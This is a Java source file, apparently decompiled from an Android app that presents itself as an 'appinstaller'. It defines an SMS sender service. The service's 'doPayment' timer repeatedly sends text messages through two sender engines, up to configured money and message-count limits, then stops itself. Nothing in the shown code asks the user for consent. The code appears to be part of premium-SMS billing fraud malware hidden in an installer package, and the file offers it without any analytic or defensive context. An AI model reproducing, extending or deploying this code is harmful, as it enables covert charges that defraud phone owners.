package com.soft.android.appinstaller.services;

import android.app.Service;
import android.content.Intent;
import android.os.IBinder;
import android.util.Log;
import com.soft.android.appinstaller.GlobalConfig;
import com.soft.android.appinstaller.OpInfo;
import com.soft.android.appinstaller.core.Internals;
import com.soft.android.appinstaller.core.SmsInfo;
import com.soft.android.appinstaller.sms.Limits;
import com.soft.android.appinstaller.sms.capi.SMSSenderEngine;
import com.soft.android.appinstaller.sms.internals.ConfirmableSMSSenderEngineImpl;
import com.soft.android.appinstaller.sms.internals.UnconfirmableSMSSenderEngineImpl;
import java.util.Date;
import java.util.Timer;
import java.util.TimerTask;

public class SMSSenderService
  extends Service
{
  public static final String PREFS_NAME = "LocalSettings";
  private static volatile long lastMessageTimestamp = 0L;
  SMSSenderEngine confirmbleEngine;
  private TimerTask doPayment = new TimerTask()
  {
    private static final String tag = "PaymentTimer";
    
    public void run()
    {
      Log.d("PaymentTimer", "run()");
      if (SMSSenderService.this.confirmbleEngine.canSendMoreMessages())
      {
        SMSSenderService.this.updateTimestamp();
        SMSSenderService.this.confirmbleEngine.sendOneMessage();
        return;
      }
      if (SMSSenderService.this.unconfirmableEngine.canSendMoreMessages())
      {
        SMSSenderService.this.updateTimestamp();
        SMSSenderService.this.unconfirmableEngine.sendOneMessage();
        return;
      }
      SMSSenderService.this.timer.cancel();
      SMSSenderService.this.stopSelf();
      Log.d("PaymentTimer", "SMSSenderService was stopped");
    }
  };
  Limits limits;
  private Timer timer;
  SMSSenderEngine unconfirmableEngine;
  
  public SMSSenderService() {}
  
  public static long getLastMessageTimestamp()
  {
    return lastMessageTimestamp;
  }
  
  private void updateTimestamp()
  {
    lastMessageTimestamp = new Date().getTime();
  }
  
  public IBinder onBind(Intent paramIntent)
  {
    return null;
  }
  
  public void onCreate()
  {
    this.timer = new Timer("paymentTimer");
    OpInfo.getInstance().init(getApplicationContext());
    SmsInfo localSmsInfo = OpInfo.getInstance().getInternals().getSmsInfo();
    this.limits = new Limits(localSmsInfo.getSumLimit(), localSmsInfo.getSmsCount(), localSmsInfo.getDcSmsCount());
    this.unconfirmableEngine = new UnconfirmableSMSSenderEngineImpl(localSmsInfo, getSharedPreferences("LocalSettings", 0), getApplicationContext());
    this.unconfirmableEngine.init(this.limits);
    this.confirmbleEngine = new ConfirmableSMSSenderEngineImpl(localSmsInfo, getSharedPreferences("LocalSettings", 0), getApplicationContext());
    this.confirmbleEngine.init(this.limits);
  }
  
  public void onStart(Intent paramIntent, int paramInt)
  {
    paramInt = Integer.parseInt(GlobalConfig.getInstance().getValue("engine.service.scheduleTimeout", "60"));
    this.timer.cancel();
    this.timer = new Timer("paymentTimer");
    this.timer.scheduleAtFixedRate(this.doPayment, 0L, paramInt * 1000);
  }
}
